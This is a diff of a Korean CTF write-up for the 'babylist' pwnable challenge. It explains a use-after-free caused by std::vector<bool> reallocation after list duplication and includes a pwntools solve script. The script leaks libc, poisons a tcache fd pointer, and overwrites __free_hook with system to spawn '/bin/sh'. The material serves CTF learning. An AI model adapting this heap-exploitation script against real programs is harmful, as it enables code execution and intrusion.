@@ -39,31 +39,114 @@ $$$$$$$$$$$$$$$$$$$$$$$$$$
 
 ## Exploit
 
+`Create a list`를 하면 0x88의 크기를 가진 구조체를 new로 할당한다. 해당 구조체의 맴버로 0x70짜리 char배열, 0x18짜리 vector맴버가 존재한다.
+
+해당 vector object에 존재하는 맴버를 보게되면
+
+```c++
+template <class _Allocator>
+class _LIBCPP_TEMPLATE_VIS vector<bool, _Allocator>
+    : private __vector_base_common<true>
+{
+public:
+    typedef vector                                   __self;
+    typedef bool                                     value_type;
+    typedef _Allocator                               allocator_type;
+    typedef allocator_traits<allocator_type>         __alloc_traits;
+    typedef typename __alloc_traits::size_type       size_type;
+    typedef typename __alloc_traits::difference_type difference_type;
+    typedef size_type __storage_type;
+    typedef __bit_iterator<vector, false>            pointer;
+    typedef __bit_iterator<vector, true>             const_pointer;
+    typedef pointer                                  iterator;
+    typedef const_pointer                            const_iterator;
+    typedef _VSTD::reverse_iterator<iterator>         reverse_iterator;
+    typedef _VSTD::reverse_iterator<const_iterator>   const_reverse_iterator;
+private:
+    typedef typename __rebind_alloc_helper<__alloc_traits, __storage_type>::type __storage_allocator;
+    typedef allocator_traits<__storage_allocator>    __storage_traits;
+    typedef typename __storage_traits::pointer       __storage_pointer;
+    typedef typename __storage_traits::const_pointer __const_storage_pointer;
+    __storage_pointer                                      __begin_;
+    size_type                                              __size_;
+    __compressed_pair<size_type, __storage_allocator> __cap_alloc_;
+    .
+    .
+    .
+```
+
+`__begin_`, `__size__`, `__cap_alloc_`이 존재한다. `Add a element` 메뉴를 사용하게 되면 vector.push_back(input)을 하게되는데 이때 `__size__`와 `__cap_alloc_`값이 같게되면 공간을 할당해준다.
+
+```c++
+template <class _Allocator>
+void
+vector<bool, _Allocator>::push_back(const value_type& __x)
+{
+    if (this->__size_ == this->capacity())
+        reserve(__recommend(this->__size_ + 1));
+    ++this->__size_;
+    back() = __x;
+}
+
+vector<bool, _Allocator>::__recommend(size_type __new_size) const
+{
+    const size_type __ms = max_size();
+    if (__new_size > __ms)
+        this->__throw_length_error();
+    const size_type __cap = capacity();
+    if (__cap >= __ms / 2)
+        return __ms;
+    return _VSTD::max(2*__cap, __align_it(__new_size));
+}
+
+vector<bool, _Allocator>::reserve(size_type __n)
+{
+    if (__n > capacity())
+    {
+        vector __v(this->__alloc());
+        __v.__vallocate(__n);
+        __v.__construct_at_end(this->begin(), this->end());
+        swap(__v);
+        __invalidate_all_iterators();
+    }
+}
+
+```
+
+`__recommend__`함수는 보통 기존의 capacity의 두배를 리턴하는데 이때 리턴되는 값이 max_size를 넘는지 안넘는지 확인도 하게된다.
+`reserve`는 넘어온 값을 토대로 새로운 vector 객체를 만든 후 기존 객체의 값을 모두 복사 한 뒤에 기존 객체는 삭제시킨다.
+
+다시 exploit flow로 넘어오면 먼저 libc leak을 진행하기 위해 tcache가 수용할 수 있는 size보다 더 큰 chunk를 만들어야했기 때문에 충분한 양의 element를 추가한다.
+
+그 뒤 해당 list를 `Duplicate`해서 나온 새로운 list에 다시 element를 추가해주다가 vector의 capacity가 다 차서 새로 chunk를 할당 한 후 기존의 chunk를 해제하게 되면
+
+`Duplicate`로 얻은 list가 아닌 기존의 list는 해제된 chunk를 그대로 가리키고 있기 때문에 `View element in list`로 fd, bk에 있는 libc를 leak 할 수 있게 된다.
+
+그 후 똑같이 0x90까지 할당 받은 후에 똑같이 `Duplicate`로 얻은 list에 추가를 계속 하다보면 기존 list의 fd에 해당 chunk의 주소가 덮어지게 된다.
+
+나머지는 순조롭게 진행했다. 참고로 one_gadget으로 하다보면 피를 볼 수 있으므로 정직하게 `system('/bin/sh')`를 실행시키도록 하자..
+
+~~사실 이거를 분석을 해봐야되는데... ㅎㅎ;;~~
 
 
 ## slv.py
 
-```python
+```pythonimport struct
 from pwn import *
 
 p = process('./babylist')
 
-
 id = [False for i in range(10)]
-
-
-context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
-#context.log_level = 'debug'
-
-script = '''
-
-'''
 
 sla = lambda s,c : p.sendlineafter(s, str(c))
 
 one_gadget_offset = [0x4f365, 0x4f3c2, 0x10a45c]
 __malloc_hook_offset = 0x3ebc30
 __free_hook_offset = 0x3ed8e8
+system_offset = 0x4f4e0
+binsh_str = 0x0068732f6e69622f
+
+
 def Create_list(name):
     
     idx = -1
@@ -148,7 +231,6 @@ def Remove_list(index):
 
 
 def main():
-    global script
     
     ########## STAGE 1 [libc leak] ###########
 
@@ -156,69 +238,54 @@ def main():
     a = Create_list('a')
     
     for i in range(400):
-        Add_element(a,i);
+        Add_element(a,0);
     
     b = Duplicate_list(a, 'b')
     
     for i in range(400):
-        Add_element(b,i)
+        Add_element(b,0)
     
     libc_leak = int(View_element(0,1).split(' = ')[1]) << 32
     
     libc_leak += int(View_element(0,0).split(' = ')[1]) & 0xffffffff
     
     libc_base = libc_leak - 0x3ebca0
-    one_gadget_addr = libc_base + one_gadget_offset[0]
     __malloc_hook_addr = libc_base + __malloc_hook_offset
     __free_hook_addr = libc_base + __free_hook_offset
+    system_addr = libc_base + system_offset
     
     log.info('libc_base : ' + hex(libc_base))
+    log.info('__malloc_hook_addr : ' + hex(__malloc_hook_addr))
+    log.info('__free_hook_addr : ' + hex(__free_hook_addr))
     
     
     ########## STAGE 2 [exploit] ###########
-    f = Create_list('f')
-    Add_element(f, __malloc_hook_addr & 0xffffffff)
-    Add_element(f, __malloc_hook_addr >> 32)
     
-    '''
-    using double free & tcache fd 
-    '''
-    
+   
     c = Create_list('c')
     
-    Add_element(c, 1)
+    for i in range(17):
+        Add_element(c, i)
     
     d = Duplicate_list(c, 'd')
     
-    Add_element(d, 1)
+    for i in range(32):
+        Add_element(d,i)
     
-    for i in range(4):
-        Add_element(c, i)
+    for i in range(32):
+        Add_element(c,i)
     
+    e = Create_list(p64(__free_hook_addr))
     
+    f = Create_list("dummy")
     
-    log.info('__malloc_hook_addr : ' + hex(__malloc_hook_addr))
-    log.info('__free_hook_addr : ' + hex(__free_hook_addr))
-    log.info('one_gadget_addr : ' + hex(one_gadget_addr))
-    
-    Add_element(f, 0x5eadbeef)
-    
-    g = Create_list('g')
-    Add_element(g, one_gadget_addr & 0xffffffff)
-    Add_element(g, one_gadget_addr >> 32)
-    
-    script += 'b* ' + hex(one_gadget_addr)
-    gdb.attach(p,script)
-    
-    h = Create_list('h')
-    Add_element(h, 0x5eadbeef)
-    
-    i = Duplicate_list(g, 'i')
-    Add_element(i , 0x5eadbeef)
+    Add_element(f, binsh_str & 0xffffffff)
+    Add_element(f, binsh_str >> 32)
     
     
-    #sla('> ', 1)
-    #Add_element(h,2)
+    g = Create_list(p64(system_addr))
+    
+    Add_element(f,2)
     
     
     p.interactive()
@@ -234,12 +301,11 @@ if __name__ == '__main__':
     
 ```
 
-libc_leak은 성공..(20.08.31)
-exploit 절반 성공... rsp를 0x10으로 aligned 시켜줘야됨 ~~개빡치네 진짜로~~(20.09.1)
-one_gadget의 조건을 맞추지 못하고 있음..
-one_gadget 포기, system('/bin/sh')로 전향... 왜 안풀리냐...(20.09.03)
 
 ## 느낀 점
 
+1. vector 소스코드 분석을 좀 진행해봐야겠다.
+2. 해당 chunk의 fd가 왜 저렇게 덮어지는지 분석해봐야겠다.
+3. C++ 문제를 좀 많이 풀어봐야겠다.
 
 ## Reference
